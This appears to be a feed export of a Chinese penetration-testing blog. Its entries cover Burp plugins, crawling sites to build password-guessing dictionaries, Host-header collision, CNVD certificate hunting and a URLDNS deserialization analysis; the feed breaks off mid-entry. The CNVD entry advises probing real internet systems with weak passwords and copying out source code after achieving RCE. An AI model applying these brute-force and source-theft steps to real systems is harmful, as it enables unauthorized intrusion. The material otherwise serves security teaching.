        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>要问搞渗透必须要打开的一款软件是什么，我猜大多数的师傅都会是burpsuite这款软件，burpsuite的功能十分强大，其也集成了一些漏洞扫描的功能，但是在渗透测试过程中，burpsuite所提供的漏洞扫描功能似乎还是差点感觉，特别是在一些专项的漏洞检测过程中。为了更好的满足我们渗透测试人员的需求，burpsuite是支持插件的扩展的，用户可以自定义一些漏洞检测插件来完善burpsuite的漏洞检测能力，以下就推荐一些我自己个人使用的一些burpsuite插件，其中一些插件也是成功帮助我挖掘到过一些0day（这里另外感谢一下开发这些插件的大佬们）</p><h1 id="0x02-burpsuite武器库"><a href="#0x02-burpsuite武器库" class="headerlink" title="0x02 burpsuite武器库"></a>0x02 burpsuite武器库</h1><p>以下文章主要还是以插件推荐为主，只做一个简单的介绍，具体插件使用展开写篇幅太长，且这些插件使用的难度也都不大，所以师傅们可以自己琢磨一下。</p><p>log4j2burpscanner</p><p>一款被动的log4j2漏洞扫描插件，log4j2这种核弹级的漏洞爆发，互联网存在的log4j2漏洞还是非常之多的，本人自己曾也是借助过这款插件发现过几个0day。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/f0ng/log4j2burpscanner</span><br></pre></td></tr></table></figure><p>BurpShiroPassiveScan</p><p>一款被动的shiro漏洞扫描插件，现在市面上存在许多优秀的shiro漏洞利用图形化工具，但是每次单独打开一个shiro漏洞利用工具都显得非常麻烦，且在shiro指纹识别上，这款插件相比于一些图形化的利用工具更有优势。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/pmiaowu/BurpShiroPassiveScan</span><br></pre></td></tr></table></figure><p>Struts2-RCE</p><p>一款Struts2漏洞扫描插件，集成在bp里面，看到action，do等后缀，都可发送到该插件做一个主动扫描。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/prakharathreya/Struts2-RCE</span><br></pre></td></tr></table></figure><p>FastjsonScan</p><p>BurpFastJsonScan</p><p>两款Fastjson漏洞扫描工具，在Fastjson的漏洞检测中，这两款可以相互结合来检测和验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/Maskhe/FastjsonScan</span><br><span class="line">项目地址：https://github.com/pmiaowu/BurpFastJsonScan</span><br></pre></td></tr></table></figure><p>xia_sql</p><p>一款被动的sql注入辅助测试插件，自己平常测试总是会漏测一些参数，这款插件就完美的解决了测试者懒惰漏测参数的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/smxiazi/xia_sql</span><br></pre></td></tr></table></figure><p>BurpReflectiveXssMiao</p><p>一款反射xss漏洞检测插件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/pmiaowu/BurpReflectiveXssMiao</span><br></pre></td></tr></table></figure><p>BurpJSLinkFinder</p><p>一款基于正则来提取链接插件，该插件可平替jsfinder，这样就可以不用每次单独运行jsfinder了，自己也是利用这款插件挖掘到很多未授权访问的接口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/InitRoot/BurpJSLinkFinder</span><br></pre></td></tr></table></figure><p>403 Bypasser一款网页403bypass的插件。<br>直接在BApp Store搜索 403 Bypasser</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><p>Autorize</p><p>一款验证越权漏洞的插件。</p><p>直接在BApp Store搜索 Autorize</p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>Wsdler一款用于辅助测试wsdl接口的插件。<br>直接在BApp Store搜索 Wsdler</p><p><img src="/images/pasted-21.png" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试如何打造社工字典</title>
      <link href="/2023/05/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8/"/>
      <url>/2023/05/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="爬取页面内容"><a href="#爬取页面内容" class="headerlink" title="爬取页面内容"></a>爬取页面内容</h1><p>利用工具：cewl-&gt;(kali)</p><p>参数详解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">-h、 --help：显示帮助。</span><br><span class="line">-k、 --keep：保留下载的文件。</span><br><span class="line">-d&lt;x&gt;，--depth&lt;x&gt;：蜘蛛的深度，默认值为2。</span><br><span class="line">-m、 --min_word_length：最小字长，默认值为3。</span><br><span class="line">-o、 --offsite：让spider访问其他站点。</span><br><span class="line">--exclude：包含要排除的路径列表的文件</span><br><span class="line">--allowed：路径必须匹配才能遵循的正则表达式模式</span><br><span class="line">-w、 --write：将输出写入文件。</span><br><span class="line">-u、 --ua&lt;agent&gt;：要发送的用户代理。</span><br><span class="line">-n、 --o-words：不输出单词列表。</span><br><span class="line">--lowercase：将所有分析的单词小写</span><br><span class="line">--with-numbers：接受带有数字和字母的单词</span><br><span class="line">--convert-umlauts：转换通用ISO-8859-1（拉丁语-1）元音（ä-ae，ö-oe，ü-ue，ß-ss）</span><br><span class="line">-a、 --meta：包含元数据。</span><br><span class="line">--meta_file文件：元数据的输出文件。</span><br><span class="line">-e、 --email：包括电子邮件地址。</span><br><span class="line">--email_file&lt;file&gt;：电子邮件地址的输出文件。</span><br><span class="line">--meta-temp dir&lt;dir&gt;：exiftool在解析文件时使用的临时目录，默认为/tmp。</span><br><span class="line">-c、 --count：显示找到的每个单词的计数。</span><br><span class="line">-v、 --verbose：详细。</span><br><span class="line">--debug：额外的调试信息。</span><br><span class="line"></span><br><span class="line">身份验证</span><br><span class="line">--auth_type：摘要或基本。</span><br><span class="line">--auth_user：身份验证用户名。</span><br><span class="line">--auth_pass：身份验证密码。</span><br><span class="line"></span><br><span class="line">代理服务器支持</span><br><span class="line">--proxy_host：代理主机。</span><br><span class="line">--proxy_port：代理端口，默认为8080。</span><br><span class="line">--proxy_username：代理的用户名（如果需要）。</span><br><span class="line">--proxy_password：代理的密码（如果需要）。</span><br><span class="line"></span><br><span class="line">邮件头</span><br><span class="line"></span><br><span class="line">--header，-H：格式名称：value-可以传递多个。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl url -m 3 -d 3 -e -c -v -w a.txt --with-numbers</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-0.png" alt="upload successful"></p><p><img src="/images/pasted-12.png" alt="upload successful"></p><p>可直接使用爬取出的信息做一个爆破，爆破无果可对之前爬取出信息中无用信息做一个简单剔除，然后再结合人工浏览页面筛选出一些带有社工意义的信息，如姓名，电话，联系方法，公司名称等，这些信息的收集我们也可以通过whois反查结合站点的注册人信息，注册人邮箱等。</p><h1 id="社工字典生成"><a href="#社工字典生成" class="headerlink" title="社工字典生成"></a>社工字典生成</h1><p>利用工具：白鹿社工字典为例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/z3r023/BaiLu-SED-Tool</span><br></pre></td></tr></table></figure><p>对我们之前通过爬取和一起其他手段搜集过来的信息整理号然后把其放入A项结合一些特有弱口令再次生成社工字典</p><p><img src="/images/pasted-14.png" alt="upload successful"></p><p><img src="/images/pasted-16.png" alt="upload successful"></p><p>如果还是无果，我们还可以自己写一个小脚本，去生成用户极有可能设置的社工弱口令然后再与一些常见弱口令进行一个拼接进行爆破。</p><p>该处以姓名：张三为例</p><p>那我们可以写脚本生成如下社工口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zhangsan   //全拼音</span><br><span class="line">zhangs     //全姓简名</span><br><span class="line">zsan       //简姓全名</span><br><span class="line">zs         //简姓简名</span><br><span class="line">张三       //中文名字（还真碰到过用中文作用户名的）</span><br><span class="line">//等等，师傅们发散思维</span><br></pre></td></tr></table></figure><p>可以把我们脚本生成的的社工口令直接进行一个爆破，无果可以再用白鹿社工字典结合一些常见弱口令再次生成社工字典，再次进行爆破。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 社会工程学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC突破边界寻找隐匿资产小技巧（HOSTS碰撞）</title>
      <link href="/2023/04/30/SRC%E7%AA%81%E7%A0%B4%E8%BE%B9%E7%95%8C%E5%AF%BB%E6%89%BE%E9%9A%90%E5%8C%BF%E8%B5%84%E4%BA%A7%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%88HOSTS%E7%A2%B0%E6%92%9E%EF%BC%89/"/>
      <url>/2023/04/30/SRC%E7%AA%81%E7%A0%B4%E8%BE%B9%E7%95%8C%E5%AF%BB%E6%89%BE%E9%9A%90%E5%8C%BF%E8%B5%84%E4%BA%A7%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%88HOSTS%E7%A2%B0%E6%92%9E%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在SRC漏洞挖掘中或者渗透测试中，前期收集好各种WEB应用，开心的打开Burpsuite准备大干一场的时候，发现全是403 404 400 500，于是你开始扫描端口、爆破目录，但是什么都没有信息都没有出来，结果灰溜溜的关闭了浏览器和你的Burpsuite。作为安全圈的老混子，碰到这种情况我们该怎么破局呢？</p><h1 id="0x02-HOSTS碰撞"><a href="#0x02-HOSTS碰撞" class="headerlink" title="0x02 HOSTS碰撞"></a>0x02 HOSTS碰撞</h1><p>我们在平常摸鱼中，经常会碰到这样一种情况，直接利用ip访问显示的是403 404 400 500，但是用域名请求就会返回正常业务。当然在排除WAF作祟下（有一些WAF它会要求使用域名访问，使用IP的会出现WAF的拦截界面），我们就可以利用hosts碰撞技术来尝试一下是否能突破边界。</p><h1 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h1><p>漏洞产生的根本还是源于配置不当，一些系统配置了内网访问，但是由于配置不当的话，例nginx配置不当，或者nignx default_server没有配置或者配置内网，那么内网的业务可能存在被传出的风险。</p><h1 id="0x04-漏洞利用步骤"><a href="#0x04-漏洞利用步骤" class="headerlink" title="0x04 漏洞利用步骤"></a>0x04 漏洞利用步骤</h1><p>一、收集目标的域名和IP作为字典</p><p>可使用一些工具如oneforall</p><p><img src="/images/pasted-1.png" alt="upload successful"></p><p>也可结合其他工具，搜集的域名和IP越详细越好</p><p>二、利用脚本碰撞</p><p>脚本地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fofapro/Hosts_scan</span><br></pre></td></tr></table></figure><p>将搜集到的域名和IP分别放入hosts.txt 和 ip.txt</p><h1 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h1><p>搭建环境</p><p>安装nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]<span class="comment"># yum install -y epel-release</span></span><br><span class="line">[root@localhost etc]<span class="comment"># yum -y update</span></span><br><span class="line">[root@localhost etc]<span class="comment"># yum install -y nginx</span></span><br></pre></td></tr></table></figure><p>配置漏洞环境</p><p>1、设置反向代理</p><p>这里用apache模拟反向代理端口（实际上应该还要创建一个网卡去模拟内网端口，为了省事就模拟一下端口吧），为了防止端口与nginx冲突，我们修改为8000端口。</p><p>2、限制IP访问</p><p>配置文件位置&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>替换配置文件中的http部分如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">  include /etc/nginx/conf.d/*.conf;</span><br><span class="line">  # 限制IP访问</span><br><span class="line">  server &#123;</span><br><span class="line">    listen 80 default;</span><br><span class="line">    server_name _;</span><br><span class="line">    return 403;</span><br><span class="line">    &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">          listen       80;</span><br><span class="line">          server_name  www.test.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">              #反向代理  </span><br><span class="line">              proxy_pass http://192.168.178.143:8000;</span><br><span class="line">              index  index.html index.htm index.jsp;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置好访问结果如下</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>然后我们修改本地hosts文件，添加一条本地解析</p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>然后使用<a href="http://www.test.com进行访问/">www.test.com进行访问</a></p><p><img src="/images/pasted-9.png" alt="upload successful"></p><p>即可访问到apache默认页面，假设某公司内部系统也错误配置，我们即可访问到该公司的内部系统。</p><p>3、脚本复现</p><p>下载脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fofapro/Hosts_scan</span><br></pre></td></tr></table></figure><p>把收集过来的域名和IP分别存入hosts.txt 和 ip.txt</p><p>然后运行脚本</p><p><img src="/images/pasted-10.png" alt="upload successful"></p><p>可以看到碰撞成功的结果</p><h1 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h1><blockquote><p><a href="http://r3start.net/wp-content/uploads/2019/08/2019080916135087.pdf">http://r3start.net/wp-content/uploads/2019/08/2019080916135087.pdf</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Web安全 </tag>
            
            <tag> SRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD原创证书获取姿势</title>
      <link href="/2023/04/30/CNVD%E5%8E%9F%E5%88%9B%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/04/30/CNVD%E5%8E%9F%E5%88%9B%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>挖CNVD证书是在准备出去实习的时候，想着挖个CNVD证书丰富一下自己的简历，再到后来挖CNVD证书完全是因为众测实在是太卷了，出洞率低，重洞率高，导致自己经常挖完众测之后就emo，然后去挖CNVD找一些存在感。很多师傅感觉挖CNVD证书很难，要挖掘0day出来。确实，要挖0day，听起来确实是挺困难的，但是挖CNVD证书不像是众测有限定的资产，互联网上存在的系统数不胜数，我们只需要利用一些小技巧，找到满足发放证书的系统，然后在这里面去寻找相对薄弱的系统来进行挖掘，这样相对来说挖掘到证书的概率还是相对来说大上不少的。到写文章为止，除去还有几份未审核完的报告，我自己是存在4张CNVD证书的。在证书挖掘过程中，自己并未太刻意深入的去挖掘，非要说刻意去干的一件事还是在寻找CNVD证书发放条件的资产上。以下就总结一下自己挖掘CNVD证书的小技巧，希望对师傅们以后挖掘CNVD证书有所帮助。</p><h1 id="0x02-概览"><a href="#0x02-概览" class="headerlink" title="0x02 概览"></a>0x02 概览</h1><p>大致画了个思维导图（感觉不清楚的，可以加我微信，我发原图给师傅）<br><img src="/images/pasted-5.png" alt="upload successful"></p><h1 id="0x03-证书获取条件"><a href="#0x03-证书获取条件" class="headerlink" title="0x03 证书获取条件"></a>0x03 证书获取条件</h1><p>条件一：通用漏洞（网上没有记录—0day）</p><p>条件二：公司注册资金超过5000万</p><p>条件三：所提交漏洞获得中危及中危以上评分</p><p>条件四：互联网可复现案例需要三例（建议多放几例，防止审核过程中存在案例失效，我一般放10）</p><p>or</p><p>事件型漏洞必须是三大运营商（移动、联通、电信）的中高危漏洞，或者党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞才会颁发原创漏洞证书</p><h1 id="0x04-白盒挖掘"><a href="#0x04-白盒挖掘" class="headerlink" title="0x04 白盒挖掘"></a>0x04 白盒挖掘</h1><p>自己最初挖CNVD的时候是采用白盒的方式来挖取的，什么是白盒，就是找一些开源的系统，直接去审计代码，但是慢慢我在尝试挖掘的过程中发现一件尴尬的事。遇到小型的系统（厂商），挖掘出来漏洞，但是不满足证书发放的条件。遇到中型的系统（厂商），会碰到一些扯皮的厂商，说是开源项目，不在管辖范围中之内（翻译一下就是你们用的我开源的产品，没收你们钱，出了问题是你们自己的事）</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p>哎，格局呢。遇到大型的系统（厂商），其对代码审计的能力要求比较高，所以比较难审计出洞，所以慢慢的后面我就改变思路改为黑盒挖去了。那为什么还要写白盒挖取这个，是因为有一些代码审计能力比较强的师傅，可以考虑一下这种挖掘方式，毕竟白盒的挖掘方式比黑盒更容易出洞。</p><h1 id="0x05-黑盒挖掘"><a href="#0x05-黑盒挖掘" class="headerlink" title="0x05 黑盒挖掘"></a>0x05 黑盒挖掘</h1><p>主要还是写写黑盒挖掘，自己的证书也全是黑盒挖掘过来的。那在挖掘CNVD证书的过程中，我认为最重要的一部分还是在选择挖掘目标上面。那怎么样去寻找满足发放证书条件的目标呢，以下有三个方法。</p><p>① 利用空间测绘寻找</p><p>② 利用脚本寻找</p><p>③ 在CNVD官网寻找</p><p>首先来讲讲第一个方法：利用空间测绘，这里以fofa为例</p><p>我们可以搜索一些常见的系统可能使用的名称，比如说”管理系统”、”登录系统”、”某某平台”等等</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p>还可以利用组合语法如一些常见登录系统会使用到的一些js文件，css文件等去进行寻找,比如</p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>然后找到这些系统之后，看看归属于哪个公司，判断其归属于哪个公司，最好用的方法就是，在这种技术支持上去看是属于哪个公司</p><p><img src="/images/pasted-13.png" alt="upload successful"></p><p>当然也有一些系统是没有这种技术支持的，这个时候我们就需要一些其他的方法去判断其归属于哪个公司，有源代码中有注释的，有进后台发现某某公司开发的，反正找归属是个细心活，没有太多的技巧。找到归属于哪一个公司之后的话，我们就可以利用爱企查等查企业信息等网址对该公司做一个查询，看看其注册资产</p><p><img src="/images/pasted-15.png" alt="upload successful"></p><p>注册资产超过5000万，这套系统就满足发放证书的基本条件了，我们就可以进行一个挖掘，假如没超过5000万，我们就不用进行挖掘了，因为即使是挖到了洞，也不满足发放证书的条件。本人自己在最初挖掘CNVD证书的时候就是利用空间测绘这种方法，找满足条件的系统，然后进行挖掘。自己第一次挖掘CNVD的时候也是利用这种方法，也是有幸挖掘到一个Elastic的一个0day，然后申请了如下证书。</p><p><img src="/images/pasted-17.png" alt="upload successful"></p><p>这种寻找目标的劣势也很明显，第一就是寻找系统不够精准（需要手动去确定目标是否满足发放证书条件），第二就是需要我们去确定该套系统属于哪一个厂商。就如上两个问题就会浪费大量的时间，导致效率非常的低，所以不是很推荐这种寻找目标的方法。</p><p>第二个方法：利用脚本寻找</p><p>具体脚本如下文</p><p>快速获得CNVD证书的小技巧</p><p>作者：OceanSec<br>文章来源于<a href="https://oceansec.blog.csdn.net/">https://oceansec.blog.csdn.net/</a><br>这个脚本我自己没有使用过，不过其导出5000万漏洞资产，然后再结合一些工具半自动化测试确实适合快速去刷洞。</p><p>第三个方法：在CNVD官网寻找</p><p>这也是我自己使用最多的一个方法，怎么利用CNVD官网去寻找目标呢，首先来到CNVD官网。</p><p>在漏洞列表处，可以看到以往发生的安全漏洞，然后我自己比较喜欢寻找WEB应用的系统，所以我会选择一个WEB应用分类，当然师傅们也可以更具自己擅长挖掘的东西来进行选择。</p><p><img src="/images/pasted-19.png" alt="upload successful"></p><p>可以看到其会报道处某某公司的某某系统存在某某漏洞</p><p><img src="/images/pasted-23.png" alt="upload successful"></p><p>比如这里有个某某公司，那我们就可以利用爱企查去查询一下这个公司的注册资产，如果超过5000万，满足发放证书条件，那我们就可以根据这个提示去试着寻找一下这个系统，找到之后呢，我们可以利用我们平常的测试手段，尽量模仿打一下CNVD官网所通报出来的漏洞，据我打过多个的经验来看，大多数都是能打到的，找到漏洞点进行漏洞复现的。当然测试到了漏洞点，你可以尝试提交一下，不过百分之99的概率是重复的，既然重复为什么还要在这寻找目标呢。</p><p>① 其实这个系统爆出一个漏洞，其实在某种程度上，其系统的安全性就与其他相比来说较低的，那我们就可以对这个系统进行一个详细的测试，细心一点测试的话，你就会收获到一些惊喜。</p><p>② 有些系统我们测试一下弱口令，假如我们测试出来弱口令（web应用系统的弱口令CNVD是不收录的），我们可以进入后台再进行一个深度挖掘。</p><p>③ 假如CNVD爆出的是某某可以getshell的漏洞，我们可以尝试复现，假如复现成功的话，我们可以把源代码打包备份一份出来，进行一个黑盒加白盒的深度测试。</p><p>其上三个方法呢，由前到后提交漏洞重复的概率会依次降低。在发现存在某个漏洞后，我们还可以去寻找该公司的其他系统，看看该公司其他公司是否也存在该种类型的漏洞（因为一个公司不同的系统很有可能是一个开发团队写出来的，一个系统存在问题，那么其开发的另一个系统也很大概率存在该问题），那么怎么寻找该公司的其他问题呢。我们利用爱企查查询一个企业过后，我们可以来到知识产权，然后点击软件著作权信息。</p><p><img src="/images/pasted-25.png" alt="upload successful"></p><p>这里就可以寻找一些该公司开发的其他公司系统信息</p><p><img src="/images/pasted-27.png" alt="upload successful"></p><p>运气好碰到类似的系统的话，就可以开心地把一份报告变成两份报告，拿两份证书。</p><h1 id="0x06-挖掘思路"><a href="#0x06-挖掘思路" class="headerlink" title="0x06 挖掘思路"></a>0x06 挖掘思路</h1><p>掌握了收集资产的方法，接下来需要的就是一定的挖掘技巧，在挖CNVD的过程中也存在一些经常挖到的漏洞种类和一些小小的挖掘技巧。</p><p>① 大型框架导致的漏洞（如log4j2，shiro身份绕过等等）</p><p>大型框架导致的0day，特别是最新爆发的核弹级漏洞log4j2，在平常的测试过程中可以注意一下这种框架漏洞。（log4j2证书鉴赏）</p><p><img src="/images/pasted-28.png" alt="upload successful"></p><p>② 目录扫描、源代码、js文件、修改请求返回状态码探针后台地址挖掘未授权漏洞</p><p>自己在挖掘这些系统的时候，经常可以挖掘都未授权访问漏洞，挖掘未授权的方法，我们可以使用目录扫描，在源代码中、js文件中查看一些后台的url，还可以通过修改请求的状态码如把0改为1，false改为true等让系统跳转后台地址等。</p><p>③ 通过弱口令进入后台挖掘</p><p>前台的功能点功能较少，假如某个系统存在弱口令，我们就可以进入后台，扩大我们的攻击面（挖掘例子如下）</p><p>详细记录一次CNVD原创漏洞证书挖掘过程</p><p>④ 设备弱口令漏洞</p><p>虽然CNVD已经不收录WEB应用的弱口令的通用洞了，但是一些设备的弱口令漏洞其还是正常收录的。当然设备弱口令你挖掘到非常简单，但是你想挖掘到没有重复的那也是相当的卷，所以你想通过挖掘设备弱口令来获取证书的话，你就要去时刻关注这些设备厂商的动态，在其发布新设备的第一时间就去测试该新设备的弱口令，然后用上你最快的手速写好报告，提交报告，然后坐等证书。</p><p>⑤ RCE打包源码进行代码审计</p><p>当你RCE一个系统的时候，你可以把该系统的源代码打包一份出来，然后通过白盒的方式去审核源代码，进一步扩大战果。</p><h1 id="0x07-结尾"><a href="#0x07-结尾" class="headerlink" title="0x07 结尾"></a>0x07 结尾</h1><p>大概挖掘思路就是这些，当然可能还有一些没有想到的没有写上来，以后想起来的单独写写。</p><p><img src="/images/pasted-29.png" alt="upload successful"></p><p>最后祝师傅们证书满满。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS反序列化链分析</title>
      <link href="/2023/04/30/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/04/30/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>URLDNS是Java反序列化上最简单的一条链了，按实际效果来说它并不能被称为一条漏洞利用链，因为它不能执行命令，它的参数是一条URL，最终达到的效果是触发一次DNS请求。但是由于这条链没有依赖任何第三方的库，所以特别适合用来探测是否存在反序列化漏洞。</p><h1 id="HashMap的put方法触发dns请求"><a href="#HashMap的put方法触发dns请求" class="headerlink" title="HashMap的put方法触发dns请求"></a>HashMap的put方法触发dns请求</h1><p>我们先来看看如下这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://oma19i.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后我们看看dnslog平台的请求情况</p><p><img src="/assets/image-20230423173846-krvusbm.png" alt="image.png"></p><p>可以看到dnslog平台接收到dns请求，那么具体哪里触发了dns请求呢，我们可以来调试一下。</p><p><img src="/assets/image-20230423174054-am2wq36.png" alt="image.png"></p><p>跟进put方法</p><p><img src="/assets/image-20230423193315-c9iej0y.png" alt="image.png"></p><p>这里有个putVal方法，它是哈希表结构存储函数并不是我们关注的重点，可以看到putVal里面是调用了hash函数的，这里调用hash函数是HashMap为了保持传入的key唯一，所以需要对key做一个hash处理。那继续跟进hash方法</p><p><img src="/assets/image-20230423193342-ry7mgj8.png" alt="image.png"></p><p>判断key是否为null，不为null则调用key.hashCode，再跟进key.hashCode</p><p><img src="/assets/image-20230423193400-t2826su.png" alt="image.png"></p><p>这里判断hashCode值是否为-1，假如等于-1的就直接返回hashCode，hashCode在如下位置赋值</p><p><img src="/assets/image-20230423193418-uyspkb8.png" alt="image.png"></p><p>所以if语句里的条件不成立，所以继续走到handler.hashCode，这里的handler是URLStreamHandler的一个实例（此处留意一下这个handler）</p><p><img src="/assets/image-20230423193435-xmnlpg7.png" alt="image.png"></p><p>继续跟进handler.hashCode</p><p><img src="/assets/image-20230423193815-m6p9nwj.png" 